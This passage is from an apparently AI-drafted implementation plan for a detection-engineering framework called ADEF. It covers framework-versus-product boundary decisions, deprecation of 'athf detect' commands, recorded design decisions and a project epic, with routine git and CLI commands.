**Step 4: Commit**

```bash
git add skills/adef-research.md docs/skills.md
git commit -m "feat: add ADEF research skill for CTI-to-detection workflow"
```

---

## Phase 4: Gray Zone Feature Planning

### Task 7: Document Gray Zone Features

**Files:**
- Create: `docs/gray-zone.md`

**Step 1: Write gray zone doc**

```markdown
# Gray Zone Features — Framework vs Product Boundary

The 2026-06-17 meeting identified features that sit in the "gray zone" between open-source framework and commercial product. This document tracks those features and decisions about where they land.

---

## The Strategic Tension

**Tension:** Release a genuinely useful open-source framework, but not so complete that there's no reason to buy the Nebulock product.

**Initial mental model:**
- Framework = authoring + organizing layer
- Product = runtime + governance layer

**Reality:** The boundary is murkier. Some features plausibly belong on either side.

---

## Framework Principle

Features land in the framework if they meet ALL criteria:
1. **Universally needed** — every detection program benefits
2. **Deterministic** — no continuous runtime/monitoring required
3. **Stateless** — doesn't depend on production signal streams
4. **Self-contained** — no external service dependencies

Features land in the product if ANY is true:
1. Requires live signal stream access
2. Needs continuous monitoring/drift detection
3. Depends on production infrastructure (SIEM, SOAR, ticketing)
4. Involves policy/approval workflows

---

## Features in the Gray Zone

### 1. Drift Monitoring

**What:** Detect when a rule's behavior degrades over time (signal volume drops, FP rate spikes).

**Arguments for framework:**
- Conceptually part of Evolve stage
- Could be implemented as on-demand CLI: `adef detection drift D-XXXX --window 30d`

**Arguments for product:**
- Requires live access to signal stream (volume, FP/TP verdicts)
- Most useful as continuous monitoring (alert on drift), not one-shot
- Needs SIEM/SOAR integration to fetch signal data

**Decision:** **Product**. Framework ships the *concept* (Evolve stage includes drift assessment), product implements live monitoring.

**Framework contribution:** `docs/evolve-stage.md` documents drift monitoring as a recommended practice and shows example queries.

---

### 2. Signal Health Visibility

**What:** Surface how many signals each detection generates, with what quality (TP/FP rates, time-to-triage).

**Arguments for framework:**
- Could be read-only CLI: `adef detection stats D-XXXX` (queries external signal store)
- Helps analysts understand detection effectiveness

**Arguments for product:**
- Requires integration with signal/finding storage
- Most valuable as dashboards (not CLI output)
- Needs SOAR/ticketing API to fetch verdict data

**Decision:** **Product**. Framework documents the *metrics* to track, product implements dashboards.

**Framework contribution:** `docs/metrics.md` defines signal health metrics (volume, FP rate, time-to-triage, coverage %) as standards. Product implements collection.

---

### 3. Baselines and Lookups

**What:** Supporting functions detections depend on (allowlists, known-good process hashes, geo-IP databases).

**Arguments for framework:**
- Detections reference baselines; framework should model them
- Could add `baselines/` directory to workspace structure

**Arguments for product:**
- Baseline maintenance is operational (refresh schedules, staleness checks)
- Lookup data sources are environment-specific (corporate asset inventory, AD groups)

**Decision:** **Hybrid**.
- **Framework:** Documents baseline/lookup best practices, provides template structure
- **Product:** Implements baseline refresh automation, staleness alerts, integration with external sources

**Framework contribution:**
```markdown
# docs/baselines.md

Detections often reference baselines (allowlists, known-good hashes, geo-IP data). ADEF recommends storing these in `baselines/` directory:

```
adef-workspace/
  baselines/
    known-good-process-hashes.txt
    corporate-ip-ranges.csv
    privileged-users.yaml
```

Detection rules reference baselines via relative paths or variables. **Baseline maintenance (refresh, staleness) is out of framework scope** — handle via external automation or Nebulock product.
```

---

### 4. Governance Layer

**What:** Who owns what, lifecycle state, approval flows, deployment gates.

**Arguments for framework:**
- Journal frontmatter already has `owner` field
- Could add `adef detection assign D-XXXX --owner alice`

**Arguments for product:**
- Approval workflows require integrations (Slack, Jira, PagerDuty)
- Deployment gates often policy-driven (require security review, pen-test approval)
- Most valuable with RBAC and audit logging

**Decision:** **Hybrid**.
- **Framework:** Models ownership and stage gates in journals (frontmatter fields: `owner`, `reviewers`, `approved_at`)
- **Product:** Implements approval workflows, integrations, RBAC, audit trails

**Framework contribution:** Add optional frontmatter fields to journal template:
```yaml
owner: alice@example.com
reviewers:
  - bob@example.com
  - carol@example.com
approved_at: null  # Set when detection clears Govern stage
deployed_at: null  # Set when deployed to production
```

CLI commands:
```bash
adef detection assign D-XXXX --owner alice@example.com
adef detection approve D-XXXX  # Sets approved_at timestamp
```

---

## Summary Table

| Feature | Framework | Product | Rationale |
|---------|-----------|---------|-----------|
| **Drift monitoring** | Concept docs | Live monitoring | Needs signal stream access |
| **Signal health** | Metrics definitions | Dashboards | Needs SIEM/SOAR integration |
| **Baselines/lookups** | Template structure | Refresh automation | Maintenance is operational |
| **Governance** | Ownership model | Approval workflows | Integrations + RBAC |

---

## Revision Policy

This document is a living record. As features move from planning to implementation, decisions may flip. When they do:
1. Update this doc with new rationale
2. Document in `ISA.md` under `## Decisions`
3. Update roadmap if scope changes
```

**Step 2: Commit**

```bash
git add docs/gray-zone.md
git commit -m "docs: define framework vs product boundary for gray zone features"
```

---

## Phase 5: Consolidate ATHF Detect Commands

### Task 8: Audit athf detect Commands

**Files:**
- Create: `docs/athf-detect-consolidation.md`

**Step 1: Document existing athf detect commands**

```markdown
# ATHF Detect Command Consolidation

**Problem:** Both ATHF and ADEF have detection-related commands, creating overlap and confusion.

**Meeting decision:** Consolidate so detection lifecycle lives in one place (ADEF).

---

## Current State (Assumed from meeting notes)

ATHF likely has commands like:
- `athf detect new` — create detection (overlaps with `adef detection new`)
- `athf detect list` — list detections
- `athf detect validate` — schema validation
- Others TBD (audit ATHF codebase)

ADEF has:
- `adef detection {new, observe, refine, govern, evolve}` — FORGE lifecycle
- `adef hunt-promote` — promote hunt to detection

---

## Consolidation Strategy

### Option A: Deprecate athf detect (Recommended)

**Move all detection lifecycle to ADEF.**

- `athf detect` commands print deprecation warning: "Use `adef detection` instead"
- ATHF keeps hunt lifecycle (`athf hunt`)
- ATHF keeps hunt-to-detection bridge (`athf hunt promote` → calls `adef hunt-promote` internally)

**Migration:**
```bash
# Old (ATHF)
athf detect new "Suspicious process"

# New (ADEF)
adef detection new "Suspicious process"
```

**Pros:**
- Clean separation: ATHF = hunts, ADEF = detections
- Aligns with "paired siblings" doctrine
- Reduces maintenance burden

**Cons:**
- Breaking change for existing ATHF users
- Requires deprecation period

---

### Option B: Alias athf detect → adef detection

**Make `athf detect` a thin wrapper that calls `adef detection`.**

- No code duplication
- Preserves backward compatibility
- Eventual deprecation path

**Pros:**
- Gentle migration (both work)
- No immediate breaking change

**Cons:**
- Still maintains two entry points
- Confusing for new users ("which one do I use?")

---

## Recommendation: Option A (Deprecate)

Timeline:
1. **v0.2:** Add deprecation warnings to `athf detect` commands
2. **v0.3:** Remove `athf detect` commands entirely
3. Documentation updated to show `adef detection` as canonical

---

## Action Items

1. **Audit ATHF codebase:** List all `athf detect` commands
2. **Create deprecation plan:** Version timeline, warning messages
3. **Update ATHF docs:** Point users to ADEF for detection lifecycle
4. **Update ADEF docs:** Clarify "paired siblings" relationship
5. **Add migration guide:** `docs/migrating-from-athf-detect.md`
```

**Step 2: Commit**

```bash
git add docs/athf-detect-consolidation.md
git commit -m "docs: plan consolidation of athf detect commands into adef"
```

**Step 3: Create stub migration guide**

```markdown
# Migrating from athf detect to adef detection

**Effective version:** ADEF v0.2.0 / ATHF v0.X.0

---

## Why the Change?

ADEF and ATHF are **paired siblings**:
- **ATHF** = threat hunting lifecycle (LOCK pattern, hunts)
- **ADEF** = detection engineering lifecycle (FORGE pattern, detections)

To reduce overlap and clarify scope, all detection lifecycle commands now live in ADEF.

---

## Command Mapping

| Old (ATHF) | New (ADEF) |
|------------|------------|
| `athf detect new TITLE` | `adef detection new TITLE` |
| `athf detect list` | `adef detection list` (if exists) or use journals dir |
| `athf detect validate` | `adef detection refine` (includes validation) |

---

## Migration Steps

1. Install ADEF: `pip install agentic-detection-engineering-framework`
2. Initialize workspace: `adef init`
3. Replace `athf detect` calls with `adef detection`
4. Update CI/CD scripts if automated

---

## Backward Compatibility

**ATHF v0.X - v0.Y:** `athf detect` commands print deprecation warning but still work.

**ATHF v0.Z+:** `athf detect` commands removed. Use `adef detection`.

---

## Questions?

See [`docs/why-adef.md`](./why-adef.md) for adoption guide.
```

Save as `docs/migrating-from-athf-detect.md`

**Step 4: Commit**

```bash
git add docs/migrating-from-athf-detect.md
git commit -m "docs: add migration guide for athf detect → adef detection"
```

---

## Phase 6: Update ISA.md with Decisions

### Task 9: Record Decisions in ISA.md

**Files:**
- Modify: `ISA.md`

**Step 1: Add decisions from meeting to ISA.md**

Append to `## Decisions` section:

```markdown
### D-2026-06-25-A: Detection taxonomy is two orthogonal axes

**Decision:** ADEF categorizes detections by (1) kind (atomic/correlation/composite) and (2) expression (sigma/SQL/engine-specific). The two axes are independent.

**Rationale:** Prior taxonomy conflated "what it does" with "how it's written." Separating the axes clarifies that an atomic detection can be sigma OR SQL, a correlation can be streaming OR scheduled SQL, etc.

**Impact:** Documentation updated (`docs/taxonomy.md`), no code changes needed.

**Date:** 2026-06-25

---

### D-2026-06-25-B: Signals and findings are first-class artifacts

**Decision:** ADEF defines both signals (detection output) and findings (triage output) as in-scope. Full path: detection → signal → finding.

**Rationale:** Without signals as first-class, can't measure detection health or build composite detections. Without findings, triage context is lost.

**Impact:** Conceptual only in v0.1.0 (documented in `docs/signals-and-findings.md`). Future versions may add signal/finding CLI commands.

**Date:** 2026-06-25

---

### D-2026-06-25-C: Schema discovery is first-class primitive

**Decision:** ADEF ships the schema discovery method (abstract connector interface, persistence, CLI), not vendor-specific schemas.

**Rationale:** Maintaining a per-vendor schema catalog scales badly and ages fast. Ship the HOW (discovery orchestration), not the WHAT (Splunk/Sentinel/EDR schemas).

**Impact:** New module `adef/schema/`, new CLI `adef schema discover`, plugin group `adef.schema_connectors`.

**Date:** 2026-06-25

---

### D-2026-06-25-D: Interface shape decision deferred

**Decision:** UNRESOLVED. Three options: (A) CLI-first, (B) Skills-first, (C) Both (CLI primary, skills secondary).

**Recommendation:** Option C (Both). CLI for automation, skills for conversational exploration.

**Next step:** User confirms choice. Document in `docs/decisions/001-interface-shape.md`.

**Date:** 2026-06-25

---

### D-2026-06-25-E: Gray zone features follow framework principle

**Decision:** Features land in framework if: universally needed, deterministic, stateless, self-contained. Otherwise product.

**Gray zone resolutions:**
- Drift monitoring: Product (needs signal stream)
- Signal health: Product (needs SIEM integration)
- Baselines/lookups: Hybrid (framework docs structure, product automates refresh)
- Governance: Hybrid (framework models ownership, product implements workflows)

**Impact:** Documented in `docs/gray-zone.md`. No v0.1.0 implementation changes.

**Date:** 2026-06-25

---

### D-2026-06-25-F: Consolidate athf detect into adef detection

**Decision:** Deprecate `athf detect` commands. Detection lifecycle lives in ADEF. ATHF keeps hunt lifecycle.

**Rationale:** Aligns with "paired siblings" doctrine (ATHF = hunts, ADEF = detections). Reduces overlap.

**Impact:** ATHF deprecation plan needed (add warnings in v0.2, remove in v0.3). Migration guide created.

**Date:** 2026-06-25
```

**Step 2: Update ISA progress tracker**

Update `progress:` field in frontmatter to reflect new work scope.

**Step 3: Commit**

```bash
git add ISA.md
git commit -m "docs: record meeting decisions in ISA.md"
```

---

## Phase 7: Epic Creation & Task Breakdown

### Task 10: Create Project Epic Structure

**Files:**
- Create: `docs/epics/epic-001-meeting-requirements.md`

**Step 1: Write epic document**

```markdown
# Epic 001: ADEF Meeting Requirements (2026-06-17)

**Status:** Planning
**Priority:** High
**Target Version:** v0.2.0
**Created:** 2026-06-25

---

## Overview

Implement strategic decisions and new features identified in the 2026-06-17 ADEF meeting to evolve the framework from v0.1.0 baseline into the opinionated, schema-discovery-first framework described in meeting notes.

---

## Goals

1. ✅ Document detection taxonomy (kind × expression axes)
2. ✅ Define signals and findings as first-class artifacts  
3. ✅ Establish schema discovery as first-class primitive
4. ⏳ Resolve interface shape decision (CLI vs Skills vs Both)
5. ✅ Document gray zone features (framework vs product boundary)
6. ✅ Plan consolidation of athf detect commands
7. ⏳ Create ADEF research skill for CTI-to-detection workflow
8. ⏳ Implement schema discovery CLI and connectors
9. ⏳ Add governance fields to journal frontmatter

---

## Tasks

### Documentation (Phase 1)
- [x] Task 1: Document interface decision (unresolved)
- [x] Task 2: Create detection taxonomy doc
- [x] Task 3: Define signals and findings doc
- [x] Task 9: Record decisions in ISA.md

### Schema Discovery (Phase 2)
- [x] Task 4: Design schema discovery architecture
- [x] Task 5: Add schema discovery CLI command
- [ ] Task 5.1: Create example connector (generic SQL)
- [ ] Task 5.2: Add schema validation to Refine stage

### Research Skill (Phase 3)
- [x] Task 6: Create ADEF research skill
- [ ] Task 6.1: Test skill with real CTI sources
- [ ] Task 6.2: Integrate with existing MCP tools

### Gray Zone Features (Phase 4)
- [x] Task 7: Document gray zone features
- [ ] Task 7.1: Add governance fields to journal template
- [ ] Task 7.2: Add `adef detection assign` command
- [ ] Task 7.3: Add `adef detection approve` command

### ATHF Consolidation (Phase 5)
- [x] Task 8: Audit athf detect commands
- [ ] Task 8.1: Coordinate with ATHF team on deprecation timeline
- [ ] Task 8.2: Add deprecation warnings to ATHF
- [ ] Task 8.3: Update ADEF docs to clarify paired siblings

---

## Dependencies

- **ATHF team:** Coordinate on detect command deprecation
- **User decision:** Interface shape (CLI vs Skills vs Both) — blocking Task 6.2
- **Connector plugins:** Schema discovery needs at least one reference implementation

---

## Success Criteria

1. All documentation reflects meeting decisions (taxonomy, signals/findings, gray zone)
2. Schema discovery CLI functional with at least one connector
3. ADEF research skill produces detection drafts from CTI URLs
4. Interface shape decision documented and committed
5. Migration path from athf detect to adef detection clear

---

## Timeline

- **Week 1 (2026-06-25):** Documentation phase complete
- **Week 2:** Schema discovery implementation
- **Week 3:** Research skill + MCP integration
- **Week 4:** ATHF consolidation + user testing

---

## Related Documents

- Meeting notes: (paste original notes location)
- Implementation plan: `docs/plans/2026-06-25-adef-meeting-requirements.md`
- ISA decisions: `ISA.md` (D-2026-06-25-A through F)
- Gray zone doc: `docs/gray-zone.md`
- Taxonomy doc: `docs/taxonomy.md`
```

**Step 2: Commit**

```bash
git add docs/epics/epic-001-meeting-requirements.md
git commit -m "docs: create epic for meeting requirements implementation"
```

---

## Summary & Next Steps

**Plan complete and saved to `docs/plans/2026-06-25-adef-meeting-requirements.md`.**

### Phases Complete (Documentation)
✅ Phase 1: Decision documentation (taxonomy, signals/findings, interface shape)
✅ Phase 4: Gray zone feature planning
✅ Phase 5: ATHF consolidation planning
✅ Phase 6: ISA.md updates
✅ Phase 7: Epic creation

### Phases Ready for Implementation
⏳ Phase 2: Schema discovery (CLI, manager, base connector)
⏳ Phase 3: ADEF research skill (CTI-to-detection workflow)

### Blocking Decisions
🔴 **Interface shape** (CLI vs Skills vs Both) — needs user confirmation before finalizing research skill integration

---

## Execution Options

**1. Subagent-Driven (this session)**
- I dispatch fresh subagent per task
- Review between tasks
- Fast iteration in current worktree

**2. Parallel Session (separate)**  
- Open new session with executing-plans
- Batch execution with checkpoints
- Useful for long-running implementation

**Which approach would you like?**